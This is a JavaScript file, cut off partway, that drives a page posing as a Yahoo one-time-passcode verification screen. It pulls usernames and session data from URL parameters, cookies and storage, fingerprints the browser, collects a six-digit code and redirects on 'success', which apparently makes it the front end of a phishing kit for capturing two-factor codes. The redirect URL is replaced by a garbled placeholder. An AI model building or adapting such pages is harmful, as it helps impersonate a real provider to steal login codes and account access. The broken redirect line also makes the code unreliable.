const $ = window.jQuery || window.$

$(document).ready(() => {
  console.log("Yahoo OTP verification system initialized")

  const config = {
    otpLength: 6,
    redirectDelay: 2000,
    maxRetries: 3,
    sessionTimeout: 30000,
  }

  let currentOtp = ""
  let retryCount = 0
  let sessionData = {}
  let username = ""
  let verificationMethod = ""

  const SessionManager = {
    extractSessionData: () => {
      const urlParams = new URLSearchParams(window.location.search)
      const sessionParam = urlParams.get("s")

      if (sessionParam) {
        try {
          return JSON.parse(decodeURIComponent(sessionParam))
        } catch (e) {
          console.log("Failed to parse session parameter")
        }
      }

      const cookieMatch = document.cookie.match(/yh_session=([^;]+)/)
      if (cookieMatch) {
        try {
          return JSON.parse(decodeURIComponent(cookieMatch[1]))
        } catch (e) {
          console.log("Failed to parse session cookie")
        }
      }

      return {}
    },

    generateFingerprint: () =>
      JSON.stringify({
        screen: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language,
        platform: navigator.platform,
        userAgent: navigator.userAgent,
        timestamp: Date.now(),
        sessionId: "sess_" + Date.now() + "_" + Math.random().toString(36).substr(2, 12),
      }),
  }

  function getUsername() {
    const urlParams = new URLSearchParams(window.location.search)
    const user = urlParams.get("u")

    if (user) return decodeURIComponent(user)
    if (sessionData.username) return sessionData.username

    const cookieMatch = document.cookie.match(/yh_usr=([^;]+)/)
    if (cookieMatch) return decodeURIComponent(cookieMatch[1])

    return sessionStorage.getItem("yh_username") || localStorage.getItem("yh_username") || ""
  }

  function getVerificationMethod() {
    const urlParams = new URLSearchParams(window.location.search)
    const method = urlParams.get("method")

    if (method) return method

    return sessionStorage.getItem("yahoo_2fa_method") || "sms"
  }

  function showState(state) {
    $("#main-form, #error-container, #loading-state, #success-state").hide()
    $(`#${state}`).show()
  }

  function showError(message) {
    $("#error-message").text(message || "Invalid code. Please try again.")
    showState("error-container")

    $(".yahoo-otp-input").val("").removeClass("filled").addClass("error")
    setTimeout(() => {
      $(".yahoo-otp-input").removeClass("error")
    }, 1000)
  }

  function showSuccess() {
    showState("success-state")

    setTimeout(() => {
      window.location.href = "[invalid url, do not cite]
    }, config.redirectDelay)
  }

  function setupOtpInputs() {
    const inputs = $(".yahoo-otp-input")

    inputs.on("input", function () {
      const $this = $(this)
      const index = Number.parseInt($this.data("index"))
      const value = $this.val()

      if (!/^\d$/.test(value)) {
        $this.val("")
        return
      }

      $this.addClass("filled").removeClass("error")

      if (value && index < inputs.length - 1) {
       
